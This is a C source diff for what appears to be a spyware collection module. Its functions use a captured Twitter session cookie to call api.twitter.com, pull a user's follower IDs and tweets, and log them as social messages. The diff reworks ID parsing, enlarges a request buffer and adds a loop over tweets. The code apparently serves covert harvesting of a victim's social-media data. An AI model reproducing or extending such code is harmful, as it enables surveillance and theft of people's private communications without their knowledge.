@@ -25,8 +25,7 @@ DWORD ParseCategory(char *user, char *category, char *cookie)
 	BYTE *r_buffer = NULL;
 	DWORD response_len;
 	char *parser1, *parser2;
-	char cursor[512];
-	WCHAR twitter_request[256];
+	WCHAR twitter_request[4096];
 	char contact_name[256];
 	char screen_name[256];
 	HANDLE hfile;
@@ -37,41 +36,22 @@ DWORD ParseCategory(char *user, char *category, char *cookie)
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	
-	cursor[0] = 0;
 	parser1 = (char *)strstr((char *)r_buffer, "\"ids\":[");
 	if (!parser1) {
 		SAFE_FREE(r_buffer);
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 	parser1 += strlen("\"ids\":[");
-	parser2 = (char *)strchr((char *)parser1, ',');
-	if (!parser2) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	*parser2=0;
-	strcat_s(cursor, (char *)parser1);
-	strcat_s(cursor, "%2C");
-	parser1 = parser2 + 1; 
-	parser2 = (char *)strchr((char *)parser1, ',');
-	if (!parser2) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	*parser2=0;
-	strcat_s(cursor, (char *)parser1);
-	strcat_s(cursor, "%2C");
-	parser1 = parser2 + 1; 
 	parser2 = (char *)strchr((char *)parser1, ']');
 	if (!parser2) {
 		SAFE_FREE(r_buffer);
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 	*parser2=0;
-	strcat_s(cursor, (char *)parser1);
+
+	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/users/lookup.json?user_id=%S&screen_name=", parser1);
 	SAFE_FREE(r_buffer);
 
-	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/users/lookup.json?user_id=%S&screen_name=", cursor);
 	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
@@ -244,6 +224,15 @@ DWORD ParseTweet(char *user, char *cookie)
 		// XXX Sistemare il timestamp
 		GET_TIME(tstamp);
 		LogSocialIMMessageA("Twitter", tweet_ts, "Twitter", screen_name, tweet_body, &tstamp); 	
+
+		parser1 = strstr(parser1, TW_TWEET_TS);
+		if (!parser1)
+			break;
+		parser1 += strlen(TW_TWEET_TS);
+		parser2 = strchr(parser1, '\"');
+		if (!parser2)
+			break;
+		parser1 = parser2 + 1;
 	}
 
 	SAFE_FREE(r_buffer);
